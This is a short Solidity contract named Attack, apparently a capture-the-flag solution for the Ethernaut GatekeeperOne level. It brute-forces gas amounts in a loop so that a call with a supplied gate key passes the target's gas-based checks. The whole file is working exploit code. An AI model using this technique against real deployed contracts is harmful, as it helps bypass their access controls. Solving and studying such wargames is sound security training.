// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    IGatekeeperOne public target;

    constructor(address _targetAddress) {
        target = IGatekeeperOne(_targetAddress);
    }

    function attack(bytes8 _gateKey) public returns (bool) {
        for (uint256 i = 0; i < 300; i++) {
            uint256 gasToUse = 8191 * 3 + i;
            (bool success,) = address(target).call{gas: gasToUse}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                return true;
            }
        }
        return false;
    }
}
